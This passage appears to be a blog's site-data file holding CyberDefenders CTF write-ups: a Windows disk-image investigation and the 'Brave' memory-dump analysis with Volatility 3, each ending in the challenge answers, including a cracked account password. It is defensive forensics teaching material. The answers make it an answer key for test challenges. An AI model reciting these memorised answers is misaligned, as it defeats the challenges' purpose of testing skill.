data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the MD5 hash value of the suspect disk?</p>\n</blockquote>\n<p>Just inspec the  <code>ad1.txt</code>  and you’ll find useful information about the disk image like the acquisition time and the checksum</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> DiskDrigger.ad1.txt </span><br><span class=\"line\">Created By AccessData® FTK® Imager 4.5.0.3</span><br><span class=\"line\"></span><br><span class=\"line\">Case Information:</span><br><span class=\"line\">Acquired using: ADI4.5.0.3</span><br><span class=\"line\">...</span><br><span class=\"line\">[Computed Hashes]</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a</span><br><span class=\"line\"></span><br><span class=\"line\">Image information:</span><br><span class=\"line\"> Acquisition started:   Tue Jun 15 12:28:20 2021</span><br><span class=\"line\"> Acquisition finished:  Tue Jun 15 12:33:10 2021</span><br><span class=\"line\"> Segment list:</span><br><span class=\"line\">  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1</span><br><span class=\"line\"></span><br><span class=\"line\">Image Verification Results:</span><br><span class=\"line\"> Verification started:  Tue Jun 15 12:33:18 2021</span><br><span class=\"line\"> Verification finished: Tue Jun 15 12:33:51 2021</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 9471e69c95d8909ae60ddff30d50ffa1</p>\n</div>\n<blockquote>\n<p>2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)<br>\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite<br>\n<img data-src=\"https://imgur.com/YdY9w1L.png\" alt=\"\"><br>\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/jL9EEDB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  password cracking lists</p>\n</div>\n<blockquote>\n<p>3- What is the IPv4 address of the FTP server the suspect connected to?</p>\n</blockquote>\n<p>Wait man! FileZilla is installed in our system. I am sure that we will find the information in  <code>filezilla.xml</code></p>\n<p><img data-src=\"https://imgur.com/uOJpYIM.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  192.168.1.20</p>\n</div>\n<blockquote>\n<p>4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)</p>\n</blockquote>\n<p>This is EASY DUDE! just check the Recycle Bin ! You’ll find your target !<br>\n<img data-src=\"https://imgur.com/TuEyvM2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  2021-04-29 18:22:17 UTC</p>\n</div>\n<blockquote>\n<p>5- How many times was Tor Browser ran on the suspect’s computer? (number only)</p>\n</blockquote>\n<p>I guess this question is tricky! where is tor man !!! OK calm down you’ll find  <code>lnk</code>  file about tor but i think it’s fake one ! Let’s try an LNK Parser. I’ll use  <code>ericzimmerman</code>  tool !</p>\n<p><img data-src=\"https://imgur.com/GelvVNQ.png\" alt=\"\"></p>\n<p>Wow firefox.exe in TOR LNK file! This is Joke</p>\n<div class=\"note success\">\n<p>Answer:  0</p>\n</div>\n<blockquote>\n<p>6- What is the suspect’s email address?</p>\n</blockquote>\n<p>OK backing again to the browser history to check if the user visit a mailing website !<br>\n<img data-src=\"https://imgur.com/BmHa8m2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   <span class=\"exturl\" data-url=\"bWFpbHRvOmRyZWFtbWFrZXI4MkBwcm90b25tYWlsLmNvbQ==\">dreammaker82@protonmail.com</span></p>\n</div>\n<blockquote>\n<p>7- What is the FQDN did the suspect port scan?</p>\n</blockquote>\n<p>He asked about port scan?? mmm I guess nmap is here ! Nmap are you here ?<br>\n<img data-src=\"https://imgur.com/UMN9Zbr.png\" alt=\"\" title=\"NMAP: YES I AM HERE !\"></p>\n<p>Just i checked the PowerShell history. You’ll find it in  <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine</code></p>\n<p><img data-src=\"https://imgur.com/OwOcsXB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  dfir.science</p>\n</div>\n<blockquote>\n<p>8- What country was picture “20210429_152043.jpg” allegedly taken in?</p>\n</blockquote>\n<p>I tried to inspect the metadata of the image and i found GPS position information!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exiftool 20210429_152043.jpg</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">GPS Latitude                    : 16 deg 0<span class=\"string\">&#x27; 0.00&quot; S</span></span><br><span class=\"line\"><span class=\"string\">GPS Longitude                   : 23 deg 0&#x27;</span> 0.00<span class=\"string\">&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Focal Length                    : 3.7 mm</span></span><br><span class=\"line\"><span class=\"string\">GPS Position                    : 16 deg 0&#x27; 0.00&quot;</span> S, 23 deg 0<span class=\"string\">&#x27; 0.00&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Light Value                     : 13.7</span></span><br></pre></td></tr></table></figure>\n<p>Ok let’s try to find the country using GPS Coordinates Finder</p>\n<p><img data-src=\"https://imgur.com/freR9Vd.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Zambia</p>\n</div>\n<blockquote>\n<p>9- What is the parent folder name picture “20210429_151535.jpg” was in before the suspect copy it to “contact” folder on his desktop?</p>\n</blockquote>\n<p>Shellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?<br>\n <code>ShellBags</code>  are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass<br>\nThis registyr hive will save us :  <code>[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat</code></p>\n<p>ٍ<img data-src=\"https://imgur.com/IAJ0GBZ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Camera</p>\n</div>\n<blockquote>\n<p>10- A Windows password hashes for an account are below. What is the user’s password?</p>\n</blockquote>\n<p>Just try an online hash cracker</p>\n<p>ٍ<img data-src=\"https://imgur.com/eQ1U5w7.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   AFR1CA!</p>\n</div>\n"},{"title":"CyberDefenders Writeup Brave","date":"2022-09-06T10:29:37.000Z","cover":"https://cyberdefenders.org/media/terraform/Brave/brave2.png","_content":"\nThis CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!\n\n# Challenge Information \n\n\n+++info Description\n\nA memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/67\n  desc: CyberDefenders - Brave \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - DFIRScience\n  desc: DFIRScience Twitter Profile\n  url: https://twitter.com/DFIRScience\n  image: https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough \nMemory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system \n\n> 1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)\n\nWe can inspect these information using `imageinfo` plugin in volatility\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info \n\nKernel Base     0xf8043cc00000\nDTB     0x1aa000\nSymbols ........\nIs64Bit True\nIsPAE   False\nlayer_name      0 WindowsIntel32e\nmemory_layer    1 FileLayer\nKdVersionBlock  0xf8043d80f368\nMajor/Minor     15.19041\nMachineType     34404\nKeNumberProcessors      4\nSystemTime      2021-04-30 17:52:19\nNtSystemRoot    C:\\Windows\nNtProductType   NtProductWinNt\nNtMajorVersion  10\nNtMinorVersion  0\nPE MajorOperatingSystemVersion  10\nPE MinorOperatingSystemVersion  0\nPE Machine      34404\nPE TimeDateStamp        Tue Oct 11 07:04:26 1977\n```\n\n:::success\nAnswer:  2021-04-30 17:52:19\n:::\n\n\n> 2- What is the SHA256 hash value of the RAM image?\n\n```bash command line prompt\nsha256sum 20210430-Win10Home-20H2-64bit-memdump.mem\n9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem\n```\n:::success\nAnswer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172\n:::\n> 3- What is the process ID of \"brave.exe\"?\n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave\nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       \n4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56\n```\n:::success\nAnswer: 4856\n:::\n> 4- How many established network connections were there at the time of acquisition? (number)\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i \"2021-04-30\" | grep -i ESTABLISHED\n0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07\n0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58\n0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17\n0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25\n0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00\n0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18\n0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26\n0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23\n0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36\n0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36\n```\nOh wait man! Don't count it manually, just use the magic of `wc -l` !\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i \"2021-04-30\" | grep -i ESTABLISHED | wc -l\n\n10\n```\n:::success\nAnswer: 10 \n:::\n> 5- What FQDN does Chrome have an established network connection with?\n```bash command line prompt\n vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome\n0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00\n0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55\n0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53\n0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27\n0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57\n0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57\n```\nWow man! we found a single established connection with IP `185.70.41.130`\nI used a random website that give me the FQDN from the IP address!\n\n![](https://imgur.com/XJSnlsS.png)\n\n:::success\nAnswer: `protonmail.ch`\n:::\n> 6- What is the MD5 hash value of process executable for PID 6988?\n\nLet's dump the executable of the process with pid 6988, I used to do that with `procdump` plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that `windows.pslist` plugin has `--dump` argument that can dump the excutable of the process. Let's do it !\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump \nVolatility 3 Framework 2.2.0\nProgress:  100.00               PDB scanning finished\nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output\n\n6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp\n```\nNow it's time to use `md5sum` to get the md5 hash of the executable!\n```bash command line prompt\nmd5sum pid.6988.0x1c0000.dmp\n0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp\n```\n:::success\nAnswer: 0b493d8e26f03ccd2060e0be85f430af\n:::\n> 7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?\nOK we need to know the word at offset 0x45BE876! we can do it using `xxd` just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use `-s` options and to specify the length to display use `-l` option\n\n```bash command line prompt\nxxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem \n045be876: 68 61 63 6b 65 72                                hacker\n```\n:::success\nAnswer: hacker\n:::\n> 8- What is the creation date and time of the parent process of \"powershell.exe\"? (YYYY-MM-DD HH:MM:SS)\n\nWe need to know the parent process of powershell! we can do it using `pslist` and check the `PPID`. But I'll go with `pstree` plugin! it will make it easier for me. I don't want to waste my time searching at the parent process using PPID !\n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4\n* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58\n* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12\n** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A\n*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A\n*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A\n```\n:::success\nAnswer: 2021-04-30 17:39:48\n:::\n\n> 9- What is the full path and name of the last file opened in notepad?\n\nNotepad is an executable that use the file as an argument ! so `cmdline` plugin will help us the get the files opened with notepad ! \n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   \n2520 notepad.exe     \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum\n```\n:::success\nAnswer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum\n:::\n> 10- How long did the suspect use Brave browser? (hh:mm:ss)\n\nLet me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is `UserAssist`\nThe `UserAssist` key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system\n\nVolatility is powerful! we can use the `userassist` plugin to get what we want!\n\n``` bash command line prompt \nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave \n* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45\n* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45\n```\n:::success\nAnswer:  04:01:54\n:::\n\n\n","source":"_posts/CyberDefenders/brave.md","raw":"---\ntitle: CyberDefenders Writeup Brave\ndate: 2022-09-06 11:29:37\ntags:\ncover: https://cyberdefenders.org/media/terraform/Brave/brave2.png\ncategories:\n- [CyberDefenders]\n---\n\nThis CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!\n\n# Challenge Information \n\n\n+++info Description\n\nA memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/67\n  desc: CyberDefenders - Brave \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - DFIRScience\n  desc: DFIRScience Twitter Profile\n  url: https://twitter.com/DFIRScience\n  image: https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough \nMemory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system \n\n> 1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)\n\nWe can inspect these information using `imageinfo` plugin in volatility\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info \n\nKernel Base     0xf8043cc00000\nDTB     0x1aa000\nSymbols ........\nIs64Bit True\nIsPAE   False\nlayer_name      0 WindowsIntel32e\nmemory_layer    1 FileLayer\nKdVersionBlock  0xf8043d80f368\nMajor/Minor     15.19041\nMachineType     34404\nKeNumberProcessors      4\nSystemTime      2021-04-30 17:52:19\nNtSystemRoot    C:\\Windows\nNtProductType   NtProductWinNt\nNtMajorVersion  10\nNtMinorVersion  0\nPE MajorOperatingSystemVersion  10\nPE MinorOperatingSystemVersion  0\nPE Machine      34404\nPE TimeDateStamp        Tue Oct 11 07:04:26 1977\n```\n\n:::success\nAnswer:  2021-04-30 17:52:19\n:::\n\n\n> 2- What is the SHA256 hash value of the RAM image?\n\n```bash command line prompt\nsha256sum 20210430-Win10Home-20H2-64bit-memdump.mem\n9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem\n```\n:::success\nAnswer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172\n:::\n> 3- What is the process ID of \"brave.exe\"?\n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave\nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       \n4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56\n```\n:::success\nAnswer: 4856\n:::\n> 4- How many established network connections were there at the time of acquisition? (number)\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i \"2021-04-30\" | grep -i ESTABLISHED\n0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07\n0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58\n0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17\n0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25\n0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00\n0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18\n0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26\n0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23\n0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36\n0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36\n```\nOh wait man! Don't count it manually, just use the magic of `wc -l` !\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i \"2021-04-30\" | grep -i ESTABLISHED | wc -l\n\n10\n```\n:::success\nAnswer: 10 \n:::\n> 5- What FQDN does Chrome have an established network connection with?\n```bash command line prompt\n vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome\n0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00\n0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55\n0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58\n0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53\n0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27\n0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57\n0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57\n```\nWow man! we found a single established connection with IP `185.70.41.130`\nI used a random website that give me the FQDN from the IP address!\n\n![](https://imgur.com/XJSnlsS.png)\n\n:::success\nAnswer: `protonmail.ch`\n:::\n> 6- What is the MD5 hash value of process executable for PID 6988?\n\nLet's dump the executable of the process with pid 6988, I used to do that with `procdump` plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that `windows.pslist` plugin has `--dump` argument that can dump the excutable of the process. Let's do it !\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump \nVolatility 3 Framework 2.2.0\nProgress:  100.00               PDB scanning finished\nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output\n\n6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp\n```\nNow it's time to use `md5sum` to get the md5 hash of the executable!\n```bash command line prompt\nmd5sum pid.6988.0x1c0000.dmp\n0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp\n```\n:::success\nAnswer: 0b493d8e26f03ccd2060e0be85f430af\n:::\n> 7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?\nOK we need to know the word at offset 0x45BE876! we can do it using `xxd` just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use `-s` options and to specify the length to display use `-l` option\n\n```bash command line prompt\nxxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem \n045be876: 68 61 63 6b 65 72                                hacker\n```\n:::success\nAnswer: hacker\n:::\n> 8- What is the creation date and time of the parent process of \"powershell.exe\"? (YYYY-MM-DD HH:MM:SS)\n\nWe need to know the parent process of powershell! we can do it using `pslist` and check the `PPID`. But I'll go with `pstree` plugin! it will make it easier for me. I don't want to waste my time searching at the parent process using PPID !\n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4\n* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58\n* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12\n** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A\n*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A\n*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A\n```\n:::success\nAnswer: 2021-04-30 17:39:48\n:::\n\n> 9- What is the full path and name of the last file opened in notepad?\n\nNotepad is an executable that use the file as an argument ! so `cmdline` plugin will help us the get the files opened with notepad ! \n\n```bash command line prompt\nvol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   \n2520 notepad.exe     \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum\n```\n:::success\nAnswer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum\n:::\n> 10- How long did the suspect use Brave browser? (hh:mm:ss)\n\nLet me tell you something! When we speak about more details about system apps nothing will be usefull more than 